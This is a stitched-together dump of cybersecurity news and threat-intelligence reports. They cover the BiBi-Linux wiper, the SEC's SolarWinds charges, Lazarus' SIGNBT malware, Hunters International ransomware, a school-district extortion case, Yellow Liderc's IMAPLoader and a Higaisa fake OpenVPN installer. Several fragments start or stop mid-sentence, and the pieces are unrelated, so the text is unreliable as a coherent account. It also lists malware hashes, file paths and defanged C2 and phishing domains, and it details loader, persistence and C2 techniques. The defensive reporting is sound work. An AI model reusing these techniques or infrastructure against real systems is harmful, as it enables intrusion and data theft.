      "text": " A new malware wiper known as BiBi-Linux is being used to destroy data in attacks targeting Linux systems belonging to Israeli companies.The malware reveals its true nature by not dropping a ransom note or providing victims with a way to reach out to the attackers to negotiate payment for a decryptor, even though it fakes file encryption,\"Instead, it conducts file corruption by overwriting files with useless data, damaging both the data and the operating system.\"The payload (an x64 ELF executable named bibi-linux.out) found on the victim's systems allows the attackers to choose what folders to encrypt via command-line parameters.It can completely wipe a compromised device's operating system when run with root privileges if the attackers do not provide a target path, as it will attempt to delete the entire '/' root directory.BiBi-Linux uses multiple threads and a queue system for improved speed and effectiveness. It will overwrite files' contents to destroy them, renaming them using a ransom name and an extension made out of the 'BiBi' string (Bibi is a nickname used for Israel's Prime Minister, Benjamin Netanyahu) followed by a number.As seen by BleepingComputer, the number appended to the extension is the number of rounds a file has been wiped.The wiper sample discovered by Security Joes also features no obfuscation, packing, or other protective measures, making malware analysts' jobs much easier.This shows the threat actors are not concerned about their tools being captured and dissected, instead focusing on maximizing their attack's impact.Destructive malware has also been used extensively by Russian threat groups to target the systems of Ukrainian organizations since Russia invaded Ukraine in February 2022."

Brown (also facing legal action from regulatory authorities), knew about. Instead, the company reportedly disclosed only broad and theoretical risks to its investors.\"Rather than address these vulnerabilities, SolarWinds and Brown engaged in a campaign to paint a false picture of the company's cyber controls environment, thereby depriving investors of accurate material information.\"The regulator claims that Brown was already aware that attackers that would hack SolarWinds' systems remotely would be very hard to detect since at least 2018, according to presentations saying that the \"current state of security leaves us in a very vulnerable state for our critical assets\" and that \"[a]ccess and privilege to critical systems/data is inappropriate.\"Brown also expressed concerns in June 2020 that attackers could use SolarWinds' Orion software (which was trojanized by the Russian hackers to breach customers' systems months later) as a tool in future attacks because the company's backend systems were not \"resilient.\"Two months before the attack, the SEC says that a SolarWinds internal document revealed that the engineering teams were no longer able to keep up with a long list of new security issues that they had to address.\"We made a deliberate choice to speak—candidly and frequently—with the goal of sharing what we learned to help others become more secure. We partnered closely with the government and encouraged other companies to be more open about security by sharing information and best practices.\"The SEC's charges now risk the open information-sharing across the industry that cybersecurity experts agree is needed for our collective security.\"The malicious builds were used to drop the Sunburst backdoor onto the systems of \"fewer than 18,000\" victims. However, the attackers handpicked a substantially lower number of targets for second-stage exploitation.Update October 30, 18:14 EDT: A SolarWinds spokesperson sent the following statement after the article was published:We are disappointed by the SEC’s unfounded charges related to a Russian cyberattack on an American company and are deeply concerned this action will put our national security at risk. The SEC’s determination to manufacture a claim against us and our CISO is another example of the agency’s overreach and should alarm all public companies and committed cybersecurity professionals across the country.

Typically, it modifies the registry or creates scheduler tasks on Windows systems. The experts reported that the malicious code also uses multiple methods on Linux as well.The functionality within the malware modules are divided into two types, service and extended functionality modules.The malware uses the modules for storing its configuration, upgrading and uninstalling itself, establishing a reverse proxy, harvesting credentials, performing reconnaissance and files, taking screenshots, executing processes, recording microphone input, and mining for Monero.While investigating this malware, Kaspersky also discovered an apparently related ransomware variant called. Similarities include the Tor client and multiple modules observed in StripedFly.“What was the real purpose? That remains a mystery.

      "title": "A cascade of compromise: unveiling Lazarus' new campaign | Securelist",
      "text": " Solutions for:ThreatsCategories27 Oct 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsEarlier this year, a software vendor was compromised by the Lazarus malware delivered through unpatched legitimate software. What’s remarkable is that these software vulnerabilities were not new, and despite warnings and patches from the vendor, many of the vendor’s systems continued to use the flawed software, allowing the threat actor to exploit them. Fortunately, a proactive response by us detected an attack on another vendor and effectively thwarted the attacker’s efforts.Upon further investigation, we discovered that the software vendor that developed the exploited software had previously fallen victim to Lazarus several times. This recurring breach suggested a persistent and determined threat actor with the likely objective of stealing valuable source code or tampering with the software supply chain, and they continued to exploit vulnerabilities in the company’s software while targeting other software makers.Infection timelineThe adversary demonstrated a high level of sophistication, employing advanced evasion techniques and introducing SIGNBT malware for victim control. In addition, other malware found in memory included Lazarus’ prominent LPEClient, a tool known for victim profiling and payload delivery that has previously been observed in attacks on defense contractors and the cryptocurrency industry.Executive summary:In mid-July 2023, we detected a series of attacks on several victims who had been targeted through legitimate security software designed to encrypt web communications using digital certificates. The exact method by which this software was exploited to deliver the malware remains elusive. However, we identified post-exploitation activity within the processes of the legitimate software. In one instance, while examining the memory of the compromised security software from a victim’s system, we discovered the presence of the SIGNBT malware accompanied by a shellcode. This shellcode was responsible for launching a Windows executable file directly in memory.The actor uses various tactics to establish and maintain persistence on compromised systems. These include the creation of a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Additionally, in several instances, registry entries were recorded to execute legitimate files for the purpose of malicious side-loading, further ensuring a resilient persistence mechanism.Methods for loading the final payloadThe loader process retrieves the first 32 bytes from tw-100a-a00-e14d9.tmp and uses this data as an AES decryption key to decrypt the remaining contents. Once decrypted, the payload, a Windows executable identified as SIGNBT, is loaded directly into memory. In this case, the loaded payload also reads the configuration file from the same path, but with a slightly different file name.Inside this file is a base64-encoded string, mirroring the approach used in the previous SIGNBT malware method. The first 32 characters of this string serve as the AES decryption key, while the subsequent data contains configuration information used by the malware. This decrypted configuration data includes details such as three C2 addresses, which are referred to as proxies, sleep intervals, version information, monitored targets, and various other parameters critical to the malware’s operation.The majority of SIGNBT malware instances are launched through the malware loader, which operates exclusively in memory. Upon execution, the malware begins communicating with the C2 server by sending a beacon after initialization of its configuration data. In its C2 communication, the malware uses distinctive strings that start with SIGNBT. This unique characteristic has earned it the designation of SIGNBT. In addition, the malware uses different prefixes at each stage of its C2 operation to verify and maintain its activities.The malware employs a multi-step process to create a 24-byte value for various purposes. First, it generates this value with the following components:After creating this 24-byte value, the malware generates an additional 24 bytes of random data. These two sets of 24 bytes are then XORed together using another randomly generated 24-byte key. Subsequently, both the resulting value and the 24-byte key are encoded with base64. Finally, these encoded values are combined with either three or seven randomly generated HTTP parameter names. In all future C2 communications, the malware uses a similar structure, making it more challenging to detect and analyze its communications.Structure of HTTP POST dataThe malware uses a mechanism to validate the response data received from the C2 server. Specifically, it checks to see if the response data contains a hard-coded HTML script.\nDuring the validation process, the malware decodes the first 12 bytes from the C2 server using base64, replacing the spaces with plus signs to create a seven-character string. This process is then repeated with the next 12 bytes. The first seven characters from each set are then XORed and compared to the “success” string. This repetitive procedure is applied to every HTTP communication sequence to verify that the response aligns with the expected “success” criterion.Next, the malware sends HTTP requests with the SIGNBTKE header, and if it receives a “success” message from the C2 server, it activates the getInfo function within the CCBrush class. This function gathers various information about the victim’s computer, such as computer name, product name, OS details, system uptime, CPU information, system locale, time zone, network status, and malware configuration data. After sending this system-specific information, the malware sends another HTTP request with the SIGNBTGC prefix, this time using a randomly chosen embedded HTTP parameter from a list of 100 possible parameter names.\nThe data received from the C2 server is decrypted using AES with a decryption key obtained from a SIGNBTLG HTTP request. If the decrypted data is “keep”, the malware responds with an “OK” message using the SIGNBTSR prefix, indicating a successful communication. If there are problems, the malware uses the SIGNBTFI prefix to convey the nature of the problem or failure in communication. To summarize, the C2 communication process can be described as follows:C2 communication processIf the delivered data does not equal “keep”, indicating that specific instructions or actions are required, the malware proceeds to invoke the corresponding class and function for backdoor behavior. The SIGNBT malware is equipped with an extensive set of functionalities designed to exert control over the victim’s system. To perform these functions, the malware receives instructions from the C2 server in the form of a class name, function name, and any necessary parameters. It then executes the relevant function embedded in the malware’s codebase.The name of each backdoor command is straightforward, implementing commonly used Windows commands such as ping, netstat, and systeminfo. It’s important to note that the backdoor is capable of implanting an additional payload for auto execution, internally named “deploy”. This backdoor function receives file paths via command-line arguments decrypted with AES. Using this command, SIGNBT has been observed to implant the phantom DLL we already described in the SIGNBT loader section above.Based on the analysis, it is evident that the actor’s initial compromise of the victim involved exploiting vulnerabilities within the software exploit. They then proceeded to deploy the SIGNBT malware using a DLL side-loading technique. Furthermore, the actor used the backdoor capability “deploy” to implant an additional payload for automated execution. This multifaceted attack demonstrates a high level of sophistication and a deliberate effort to infiltrate and maintain control over the victim’s system.Using the comprehensive backdoor as described above, the actor deploys additional malware in the victim’s memory. Notably, these newly delivered malware variants predominantly execute in the system’s memory only, without touching the disk. Based on our telemetry, the actor has been observed to deliver such tools as LPEClient and credential dumping utilities to the victim machines.Additional payload delivered by SIGNBTThe infection chains of the three campaigns attributed to Lazarus in 2023The Lazarus group remains a highly active and versatile threat actor in today’s cybersecurity landscape. The threat actor has demonstrated a profound understanding of IT environments, refining their tactics to include exploiting vulnerabilities in high-profile software. This approach allows them to efficiently spread their malware once initial infections are achieved. Moreover, the activities of this notorious actor transcend geographic boundaries and industry sectors. They have targeted various industries, each with distinct objectives and using different tools, tactics and techniques. This underscores their recent and ongoing activity characterized by sophisticated methods and unwavering motivations.SIGNBT loader\n9cd90dff2d9d56654dbecdcd409e1ef3         %system%\\ualapi.dll\n88a96f8730b35c7406d57f23bbba734d        %system%\\ualapi.dll\n54df2984e833ba2854de670cce43b823       %system%\\ualapi.dll\nAe00b0f490b122ebab614d98bb2361f7          %system%\\ualapi.dll\ne6fa116ef2705ecf9677021e5e2f691e\n31af3e7fff79bc48a99b8679ea74b589           C:\\GoogleD\\Coding\\JS\\Node\\winhttp.dllSIGNBT\n9b62352851c9f82157d1d7fcafeb49d3LPEClient\n3a77b5054c36e6812f07366fb70b007d       %systme%\\wbem\\wbemcomn.dll\nE89fa6345d06da32f9c8786b65111928 %ProgramData%\\Microsoft\\Windows\\ServiceSetting\\ESENT.dllFile path\nC:\\GoogleD\\Coding\\JS\\Node\\SgrmLpac.exe\nC:\\GoogleD\\Coding\\JS\\Node\\winhttp.dll\nC:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100a-a00-e14d9.tmp\nC:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100b-a00-e14d9.tmp\nC:\\ProgramData\\ntuser.008.dat\nC:\\ProgramData\\ntuser.009.dat\nC:\\ProgramData\\ntuser.001.dat\nC:\\ProgramData\\ntuser.002.dat\nC:\\ProgramData\\Microsoft\\Windows\\ServiceSetting\\ESENT.dllC2 servers\nhxxp://ictm[.]or[.]kr/UPLOAD_file/board/free/edit/index[.]php\nhxxp://samwoosystem[.]co[.]kr/board/list/write[.]asp\nhxxp://theorigin[.]co[.]kr:443/admin/management/index[.]php\nhxxp://ucware[.]net/skins/PHPMailer-master/index[.]php\nhxxp://www[.]friendmc[.]com/upload/board/asp20062107[.]asp\nhxxp://www[.]hankooktop[.]com/ko/company/info[.]asp\nhxxp://www[.]khmcpharm[.]com/Lib/Modules/HtmlEditor/Util/read[.]cer\nhxxp://www[.]vietjetairkorea[.]com/INFO/info[.]asp\nhxxp://yoohannet[.]kr/min/tmp/process/proc[.]php\nhxxps://admin[.]esangedu[.]kr/XPaySample/submit[.]php\nhxxps://api[.]shw[.]kr/login_admin/member/login_fail[.]php\nhxxps://hicar[.]kalo[.]kr/data/rental/Coupon/include/inc[.]asp\nhxxps://hspje[.]com:80/menu6/teacher_qna[.]asp\nhxxps://kscmfs[.]or[.]kr/member/handle/log_proc[.]php\nhxxps://kstr[.]radiology[.]or[.]kr/upload/schedule/29431_1687715624[.]inc\nhxxps://little-pet[.]com/web/board/skin/default/read[.]php\nhxxps://mainbiz[.]or[.]kr/SmartEditor2/photo_uploader/popup/edit[.]asp\nhxxps://mainbiz[.]or[.]kr/include/common[.]asp\nhxxps://new-q-cells[.]com/upload/newsletter/cn/frame[.]php\nhxxps://pediatrics[.]or[.]kr/PubReader/build_css[.]php\nhxxps://pms[.]nninc[.]co[.]kr/app/content/board/inc_list[.]asp\nhxxps://safemotors[.]co[.]kr/daumeditor/pages/template/template[.]asp\nhxxps://swt-keystonevalve[.]com/data/editor/index[.]php\nhxxps://vnfmal2022[.]com/niabbs5/upload/gongji/index[.]php\nhxxps://warevalley[.]com/en/common/include/page_tab[.]asp\nhxxps://www[.]blastedlevels[.]com/levels4SqR8/measure[.]asp\nhxxps://www[.]droof[.]kr/Board/htmlEdit/PopupWin/Editor[.]asp\nhxxps://www[.]friendmc[.]com:80/upload/board/asp20062107[.]asp\nhxxps://www[.]hanlasangjo[.]com/editor/pages/page[.]asp\nhxxps://www[.]happinesscc[.]com/mobile/include/func[.]asp\nhxxps://www[.]healthpro[.]or[.]kr/upload/naver_editor/subview/view[.]inc\nhxxps://www[.]medric[.]or[.]kr/Controls/Board/certificate[.]cer\nhxxps://www[.]muijae[.]com/daumeditor/pages/template/simple[.]asp\nhxxps://www[.]muijae[.]com/daumeditor/pages/template/template[.]asp\nhxxps://www[.]nonstopexpress[.]com/community/include/index[.]asp\nhxxps://www[.]seoulanesthesia[.]or[.]kr/mail/mail_211230[.]html\nhxxps://www[.]seouldementia[.]or[.]kr/_manage/inc/bbs/jiyeuk1_ok[.]asp\nhxxps://www[.]siriuskorea[.]co[.]kr/mall/community/bbs_read[.]asp\nhxxps://yoohannet[.]kr/min/tmp/process/proc[.]phpAuthorsA cascade of compromise: unveiling Lazarus’ new campaignYour email address will not be published.

      "text": " The North Korean Lazarus hacking group repeatedly compromised a software vendor using flaws in vulnerable software despite multiple patches and warnings being made available by the developer.The fact that Lazarus breached the same victim multiple times indicates that the hackers aimed to steal source code or attempt a supply chain attack.\"This recurring breach suggested a persistent and determined threat actor with the likely objective of stealing valuable source code or tampering with the software supply chain, and they continued to exploit vulnerabilities in the company's software while targeting other software makers,\" explains Kaspersky.The attack was discovered by Kaspersky in July 2023, which observed Lazarus employing a diverse infection chain and post-compromise toolset.Kaspersky places this attack within the broader scope of a campaign in which Lazarus targeted various software vendors between March 2023 and August 2023.The report mentions that Lazarus targeted legitimate security software used for the encryption of web communications. However, the exact exploitation method the hackers followed remains unknown.The exploitation led to the deployment of the SIGNBT malware along with shellcode used for injecting the payload into memory for stealthy execution.Persistence is established by adding a malicious DLL ('ualapi.dll') onto Startup to be executed by 'spoolsv.exe,' or performing Windows Registry modifications.The malicious DLL file performs victim ID verification checks before it decrypts and loads the SIGNBT payload from a local filesystem path to ensure the infection proceeds onto the intended targets.SIGNBT gets its name from the distinct strings it uses for command and control (C2) communications, sending information about the compromised system and receiving commands for execution.The commands supported by SIGNBT are:SIGNBT can also fetch additional payloads from the C2 and deploy them on the host, providing Lazarus with operational versatility.Kaspersky has seen Lazarus leverage that feature on SIGNBT to load credential dumping tools and the LPEClient malware on compromised systems.LPEClient is an info-stealer and malware loader on itself, which, in its latest versions, Kaspersky says demonstrates significant evolution compared to previously documented samples.Kaspersky says Lazarus incorporates the LPEClient on other campaigns it ran in 2023, albeit it used the malware at earlier infection phases to inject other payloads.Overall, the Lazarus group remains one of the most active and dangerous threat actors, maintaining a broad targeting scope across regions and industries.Their recent actions underscore their sophisticated tactics and persistent goals, emphasizing organizations' need to proactively patch software and prevent easy exploitation of vulnerabilities for initial compromise."

      "text": " A new ransomware-as-a-service brand named Hunters International has emerged using code used by the Hive ransomware operation, leading to the valid assumption that the old gang has resumed activity under a different flag.This theory is supported by analysis of the new encryptor revealing multiple code overlaps between the two ransomware gangs.Security researchers analyzing a sample of the Hunters International malware discovered a striking resemblance to the code used in Hive ransomware attacks.Looking closer at the Hunters International sample, the researcher discovered code overlaps and similarities that match more than 60% of the code in Hive ransomware.However, the Hunters International group is denying the researchers’ “allegations” saying that they are a new service on the ransomware scene who purchased the encryptor source code from the Hive developers.“All of the Hive source codes were sold including the website and old Golang and C versions and we are those who purchased them,” the Hunters International gang says.Hive International claims that Hive’s code contained “a lot of mistakes that caused unavailability for decryption in some cases” but they fixed it.Furthermore, the new gang says that encryption is not the main goal of their operation, instead focusing on stealing data as leverage when extorting victims into paying a ransom demand.From analysis by BleepingComputer, Hunters International's encryptor appends the “.LOCKED” extension to the processed files.The malware leaves in each directory a plaintext file named \"Contact Us.txt\" with instructions for the victim to contact the attacker over Tor, through a chat page that is protected by a login specific for each victim.At the moment, their data leak site lists only one victim, a school in the UK, from where the attackers claim to have stolen almost 50,000 files consisting of data about students and teachers along with network and web credentials.It remains to be seen what fate awaits Hunters International's but with one victim published on their data leak site, the group does not appear to be too active.Whether Hive ransomware sold the source code to other cybercriminals or not, remains unknown at the moment but the gang's operations came to a sudden stop after its Tor payment and data leak site were seized in an international operation in January.According to the FBI, the gang breached more than 1,300 companies and recived ransom payments of about $100 million.The agency's activity allowed it to provide more than 1,300 decryption keys to Hive ransomware victims that had been encrypted before and after the FBI gained access to the attacker's environments."

Each of the resellers had between 300 and 2,500 customers, who paid them an annual subscription to access the illegal broadcast.The arrests were made in Vienna, Lower Austria, Salzburg, Vorarlberg, and Tyrol, with the following items seized during the law enforcement operation:\"Some of the illegally earned money was used for legal investments and thus introduced the suppliers into the higher economic cycle.\"The arrested individuals have pleaded guilty to commercial fraud, money laundering, the Access Control Act, and provisions of the Copyright Act.The remaining members of the crime group are in Germany, where the center of the illegal operations was located, but the authorities there have yet to begin civil proceedings."

      "text": " The Clark County School District (CCSD) in Nevada is dealing with a potentially massive data breach, as hackers email parents their children's' data that was allegedly stolen during a recent cyberattack.CCSD is the fifth largest school district in the US, with over 300,000 students and 15,000 teachers.On October 16, CCSD confirmed it suffered a cyberattack earlier this month, stating threat actors gained access to the district's email servers.\"Upon discovering the incident, CCSD immediately engaged a team of forensic experts to investigate the incident and ensure that CCSD operates within a safe and remediated email environment. CCSD is also cooperating with law enforcement's investigation.\"\"Thus far, the investigation revealed that the unauthorized party accessed limited personal information related to a subset of students, parents, and employees. CCSD is working diligently to identify all individuals whose information was impacted by this incident.\"In response to the attack, CCSD disabled access to its Google Workspace from external accounts and has forced reset all student's passwords.Since then, things have taken a turn for the worse, with parents reporting they are receiving emails from the threat actors warning that their child's data was leaked.\"There are over 200,000 student profiles like this which have been leaked now by the hackers. Be careful out there. Don't shoot the messenger!\"Both students and parents are upset and scared that the threat actor has their data and could potentially use it for other malicious purposes, such as identity theft or further phishing attacks.BleepingComputer contacted CCSD on Friday but did not receive a response as they were closed for the Nevada Day holiday.The threat actors contacted DataBreaches.net to share information about the attack, including a link to a \"statement\" that contains URLs for allegedly stolen data.\"We SingularityMD (the hack team), would like to make a statement for clarification. CCSD did not detect a security issue, we emailed them to tell them we had been in their network for a few months,\" reads a note by the hackers on a code-sharing site.\"For 6 years they forced students to use their birthday as their password, resetting the passwords back to their birth date each year, they even prevented the students from securing their accounts.\"\"We asked for less than one third of the Jesus F Jara's annual salary in exchange for destroying the stolen data. The callousness and incompetence of the leadership at CCSD is astounding, not only did they not cooperate, it is clear they did not communicate with principals and have still not plugged their leaky ship, meaning we still have access to the network.\"This note contains links to leaked data archives hosted on dark web and clearweb sites, containing what the hackers claim is the personal data of 200,000 students.This data allegedly contains student's emails, birth dates, ethnicity, PSAT scores, health information, suspensions, incident reports, and other information.The threat actors also leaked what they state are financial reports, staff salaries, and grant information from the district.However, parents who received some of the leaked data have already verified that the information belongs to their children, adding legitimacy to the leaks.At this time, the threat actors claim to still have access to CCSD's systems and have more data that they will leak if the school district does not pay an extortion demand.\"One final tip for CCSD, we will continue to cause trouble until you pay, or you finally kick us out of your network,\" concluded the threat actor's post.BleepingComputer has been unable to verify if the attacker's claims of still having access to CCSD systems are true.Furthermore, it should be noted that SingularityMD is not related to the AI platform under the same name."

Imperial Kitten, Tortoiseshell, TA456, Crimson Sandstorm). As reported in our previous Year in Retrospect publications,1,2,3 this threat actor remains an active and persistent threat to many industries and countries, including the maritime, shipping and logistics sectors within the Mediterranean; nuclear, aerospace and defence industries in the US and Europe; and IT managed service providers in the Middle East.In this blog we will cover a recently-observed sample of malware linked to Yellow Liderc that has been used alongside strategic web compromises. The following are the key points of our analysis:Yellow Liderc is an Iran-based threat actor that has been active since at least 2018. As previously reported in our 2020 Year in Retrospect publication, Yellow Liderc is an Islamic Revolutionary Guard Corp. (IRGC) aligned threat actor, which focuses on targeting  Aviation, Automotive, Aerospace and Defense, Logistics, Maritime and Information Technology organisations. Geographically, the threat actor focuses on targeting organsiations throughout the Middle East, Europe, both North and South America and parts of South Asia. In 2021, open source reporting documented alleged connections between the threat actor and the IRGC,4 which also aligns with our previous reporting.5Yellow Liderc is known for a variety of tactics and techniques, including phishing, social engineering and strategic web compromises. The threat actor uses both custom and off-the-shelf malware including PowerShell backdoors and infostealers in order to gather information about victim systems. The threat actor has previously used macro enabled documents that drop a VBS script, commonly referred to as LEMPO, which establishes persistence, performs reconnaissance, and exfiltrates sensitive information. The threat actor often favours exfiltration of sensitive information to an actor-controlled email account via SMTPS or IMAP, and has been observed using both dedicated mailboxes and third party services for their email accounts.78Since 2022 Yellow Liderc has frequently compromised legitimate websites and inserted malicious JavaScript,9,10,11 often referred to as a watering hole attack or strategic web compromise. The JavaScript is used by the threat actor to fingerprint website visitors by capturing user location, device, time of visits, etc. The script enables the actor to infect specific user systems, matching a target fingerprint, with malware and gain access to the organisation’s network.This activity has heavily focused on the maritime, shipping and logistics sectors within the Mediterranean. Previous open source reporting has described some of this specific targeting by the threat actor.12,13 PwC has observed the following domains being actively used by Yellow Liderc throughout 2022 and 2023 in various watering hole attacks:In some attacks, the threat actor would serve malware to their targets upon visiting the infected websites because their fingerprints apparently indicated they could be a high value target. PwC observed a new sample of malware used in those later stages, which we have named IMAPLoader. We assess that IMAPLoader is a replacement to a Python-based IMAP implant the actor used in late 2021 and early 2022.14 The overall functionality is similar to past malware leveraged by the threat actor, but IMAPLoader uses a new injection technique not previously seen with Yellow Liderc, and is detailed below.\r\n The following sample is a DLL written in .NET and acts as a downloader, leveraging email communication as a means of command and control (C2) communication.FilenameStreamingUX.dllSHA-256989373f2d295ba1b8750fee7cdc54820aa0cb42321cec269271f0020fa5ea006File typeWin32 DLLFile size175,104 bytesCreated2022-12-18 12:27:50Figure 1 – Overview of IMAPLoader’s functionalityIn order to run, IMAPLoader uses an injection technique known as ‘AppDomain Manager Injection’,15 which was first publicly disclosed in a proof of concept in 2020. The injection forces a Microsoft .NET application to load a specially crafted .NET assembly (IMAPLoader in this case). Upon execution, IMAPLoader extracts the full path to itself, and makes the Windows Console Window that is created when the application is started hidden from view. This is achieved by directly importing the Windows DLLs kernel32.dll and user32.dll and calling the GetConsoleWindow and ShowWindow APIs respectively.The malware then queries the IMAP accounts (email addresses) hardcoded in the DLL which are both decimal encoded. These include two email addresses and passwords, which once decoded, show Yandex email addresses, a common email provider used by this threat actor:The malware then runs a WMI query to determine the operating system version, followed by scheduling tasks depending on the version identified. One of those tasks is to check for specific mailbox folders in a folder misspelled by the threat actor. Messages in the \"Recive\" folder are likely to contain further payloads as attachments. IMAPLoader proceeds to compile a list of unseen messages in this folder and prepare for attachment extraction via the hard coded Yandex email addresses.Depending on which Yandex account successfully logged in to, a new object imapClient3 is created which can interact with the remote email. By calling WMI class Win32_ComputerSystemProduct, IMAPLoader extracts the system UUID strings. This is later converted into a SHA-256 hash value and the first 21 characters (converted to uppercase) are used as an identifier in any further communication with the IMAP account. This likely indicates the Yandex accounts are intended for use across multiple victims, in contrast to their previous Python-based IMAP implant.The briefly mentioned extraction of attachments uses the Ux.Attachment method to return a dictionary object, where the first entry is the name of the attachment (stored as a string), and the second entry stores the raw attached file as a byte object. The attachment is subsequently stored in the same location on disk as IMAPLoader. We also observed in the code that there is a persistence mechanism via Ux.EditTask. This method ensures persistence on the system for the new retrieved payload, which we assess is likely to be a PE executable file. The method is used to edit the Windows task (previously created by IMAPLoader as StreamingUX Updater [version number]) by updating the path to point to the new payload.In the last chain of actions, the new payload is executed, by calling the ProcessStartInfo class. Finally, a new thread is created in the context of IMAPLoader which is used to fingerprint the system and exfiltrate collected content by sending an email to the same IMAP account used to retrieve the payload. While we have previously observed the threat actor developing .NET malware which uses similar email-based C2 channels and hard-coded commands to gain information about the victim's environment, IMAPLoader is executed via the 'AppDomain Manager Injection' technique, a technique we have not observed Yellow Liderc using before, which shows an evolution of this threat actors tools and techniques.We detected another sample from September 2022 which we assess is an earlier version of IMAPLoader:FilenamesaveImapMessage.exeSHA-25632c40964f75c3e7b81596d421b5cefd0ac328e01370d0721d7bfac86a2e98827File typeWin32 EXEFile size170,496 bytesCreated2101-11-11 01:04:26PDB pathF:\\vsp\\saveImapMessage\\saveImapMessage\\obj\\Debug\\saveImapMessage.pdbAlthough saveImapMessage.exe is an EXE file rather than a DLL, this shares a similar .NET file structure. It also contains the same functionality as our original sample (StreamingUX.dll) which in this case is located in a namespace called ‘downloader’. We also found a .NET DLL named JobTitle.dll which shares a partial PDB path with saveImapMessage.exe (F:\\\\vsp\\) and drops a version of IMAPLoader to the victim’s system. The infection chain for IMAPLoader is composed of three stages, using a decoy Excel document and legitimate Microsoft application for injection as seen in Figure 3.\nFigure 3 - Infection chain to deliver and execute IMAPLoaderThe first stage is distributed as an Excel-DNA XLL plugin,17 an open source library that enables .NET integration into Microsoft Excel files. One of its resources is called JOBTITLE which stores the 2nd stage component of the multi-part infection chain.As soon as JobTitle.dll is executed, it writes a C# source code file named source.cs to disk. This is subsequently compiled into a .NET DLL file called sign.dll, a version of IMAPLoader, by leveraging the native C# compiler tool csc.exe.Three additional files extracted by JobTitle.dll from its resources are also written to disk: a benign Microsoft Excel document, a modified Microsoft Windows application and an associated configuration file.The last DLL has the same functionality as discussed in the earlier StreamingUX.dll IMAPLoader analysis. The email addresses used for C2 communication also match our earlier analysis indicating the threat actor has likely reused its infrastructure for different victims. As per the previous sample, host fingerprinting is performed at every new payload execution, by creating a new process and executing cmd.exe with the same parameters as before.Pivoting on the strategic web compromise infrastructure shows links to infrastructure we assess is likely used by Yellow Liderc in their phishing operations. For example, both ztransportorganizationil[.]xyz and officemicrosoftsign[.]com shared a resolution at IP 138.124.183[.]100. Many similar domains can be identified from additional pivots made on this threat actor's infrastructure that have been active since at least 2022, such as the one shown in Figure 4. Figure 4 – Phishing page hosted on cheapfortest[.]storeAll of this assessed phishing activity is likely aimed at a wider target audience, rather than solely focused on the maritime or shipping sectors within the Mediterranean. Some of the domains are generically themed around Microsoft accounts which can be used against a wide variety of targets, while other domains are specifically aimed at the travel and hospitality sectors within Europe. In some cases, the threat actor is likely credential harvesting based on observations of the phishing pages being served. For example, Figure 5 below, shows a generic Microsoft login page that Yellow Liderc is using to trick targets into entering their credentials. It is assessed that the likely delivery method of this and similar domains described throughout are sent via spear phishing emails. Figure 5 – Phishing page hosted on loginlive[.]formsmicrosoftoffice[.]com[.]oauth2[.]liveIn other cases, malware is served to targets upon visiting the phishing website. For example, the threat actor served a macro-enabled Excel document that drops a VBScript. The use of macro-enabled documents that drop VBScripts is very similar to past Yellow Liderc activity which we have reported on privately,18 alongside open source reporting.19\nFilenameincome_statement1.xlsmSHA-2561a996d98ab897bbc3a0249ea43afaf841b31396be7cbe61b443a58d1c9aab071File typeXLSMFile size3,122,078 bytesCreated2011-05-30 Figure 6 – Macro-enabled document served visiting phishing websitesUpon opening, the macro-enabled Excel document contains a custom message requesting the user to enable macros.

      "title": "Higaisa APT Resurfaces via Phishing Website targeting Chinese Users — Cyble",
      "text": " Cyble Research and Intelligence Labs (CRIL) discovered a phishing website named “open-vpn[.]top” on October 16th. This deceptive site is designed to imitate the legitimate OpenVPN website. It is suspected to be associated with a new campaign initiated by an Advanced Persistent Threat (APT) group called Higaisa.Higaisa APT is believed to have South Korean origins and was initially disclosed by Tencent Security Threat Intelligence Center in early 2019. The group’s malicious activities can be traced back to at least 2016, involving the use of Trojans such as Gh0st and PlugX, as well as mobile malware. Their targets encompass government officials, human rights organizations, and other entities associated with North Korea.Phishing websites are frequently utilized by Threat Actors (TAs) as their primary method for distributing malware. These TAs frequently employ brand impersonation in their phishing campaigns, adeptly tricking users into a false sense of trust and legitimacy, ultimately enticing unsuspecting individuals. Given the widespread use of VPNs by individuals to overcome online censorship, it is conceivable that these TAs are specifically targeting those seeking to evade such restrictions. The image below depicts the fraudulent OpenVPN website.The website hosted a malicious OpenVPN installer file, which is bundled with a genuine OpenVPN executable and a malicious Rust-based executable. Notably, the Rust-based executable has a valid digital signature. This digital signature is attributed to the Chinese organization “Zhiya Yunke (Chengdu) Finance and Tax Service Co., Ltd.,” as shown below.We have obtained a file named “OpenVPN.exe” from the phishing website. This file is a 32-bit Graphical User Interface-based executable.Upon execution of the file, it initiates a prompt for the user to choose their desired language, as shown in the figure below. It displays an installation wizard to proceed with the installation process.During the installation, the installer drops several files in the “C:\\Program Files (x86)\\OpenVPN” directory. These files consist of the genuine OpenVPN MSI installer (openvpn.msi), two legitimate runtime DLLs (vcruntime140.dll & vcruntime140Org.dll), and an additional malicious 64-bit console-based executable file written in the Rust programming language named “rom.exe,” which is a shellcode runner. Then, the installer file executes the malicious “rom.exe” file.The figure below shows the files dropped by the OpenVPN executable.When “rom.exe” is executed, the malware employs Windows APIs such as FindResource(), LoadResource(), and SizeofResource() to search for encrypted content stored within the executable’s resource section. Subsequently, it decrypts this content, which is a Shellcode and proceeds to execute it. The figure below shows the malware locating and executing the Shellcode.Upon execution, the Shellcode conducts an anti-debugging check by calculating a 32-bit hash of the current code section and subsequently comparing it to the original 32-bit hash of the code section. This check is designed to detect debugging attempts. When a debugger is in use, and a breakpoint is added, the debugger inserts the opcode “0xCC” at the location where the original opcode existed. This alteration to the opcode disrupts the original hash of the code section. If the hash does not match, the Shellcode terminates itself. The figure below shows the hash comparison.Subsequent to performing the anti-debugging operation, the malware proceeds secondary decryption of the Shellcode using a 16-byte XOR key and executes it, as shown in the figure below.After decryption, it creates a new thread with the purpose of generating a cryptographic session key. This key is intended to be sent to the C&C server to establish a secure communication channel.To generate the session key, the Shellcode initially utilizes the API function UUIDCreate(), which generates a 16-byte UUID (Universally Unique Identifier). This UUID will then be used for creating an AES encryption key. The code responsible for creating this UUID is depicted in the figure below.After generating the initial UUID, it proceeds to create an additional UUID. The last byte of the newly created UUID is typically used to generate a byte that will be used to compute a 32-bit hash using ROR and ADD-based instructions. This process is similar to the process used by shell code to compute hash at the time of anti-debugging operation. This 